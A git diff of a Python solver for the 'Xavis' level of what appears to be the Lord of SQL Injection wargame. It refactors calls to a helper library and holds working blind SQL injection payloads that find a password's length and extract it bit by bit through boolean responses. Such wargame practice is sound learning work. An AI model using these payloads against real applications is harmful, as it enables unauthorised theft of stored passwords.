@@ -4,6 +4,10 @@ import los
 from getpass import getpass
 
 
+def check_func(response: str) -> bool:
+    return 'Hello admin' in response
+
+
 def main():
     '''
     Xavis
@@ -35,7 +39,8 @@ def main():
         exit(1)
 
     payload = "'||length(pw)>%s#"
-    len_of_key = los.find_key_len(url, payload, 'pw', 'Hello admin', cook)
+    param = dict(pw=payload)
+    len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
 
@@ -45,30 +50,8 @@ def main():
 
     payload = "'||mid(lpad(bin(ord(mid(pw,%s,1))),%s,0),%s,1)=1#"
     param = dict(pw=payload)
-    result = los.find_pass_over_bits(url, param, len_of_key, 'Hello admin',
+    result = los.find_pass_over_bits(url, param, len_of_key, check_func,
                                      cook, unicode_len_bit)
-
-    '''
-    for j in range(1, len_of_key * 8 // unicode_len_bit + 1):
-
-        bit = ''
-
-        for i in range(1, unicode_len_bit + 1):
-            payload = f"'||mid(lpad(bin(ord(mid(pw,{j},1))),{unicode_len_bit},0),{i},1)=1#"
-            param = dict(pw=payload)
-            response = los.get_request(url, param, cook)
-
-            if 'Hello admin' in response:
-                bit += '1'
-            else:
-                bit += '0'
-
-        uni_letter = chr(int(bit, 2))
-        print(uni_letter)
-        result += uni_letter
-    '''
-    print(result)
-    print(len(result.encode('utf-8')))
 
     param = dict(pw=result)
     response = los.get_request(url, param, cook)
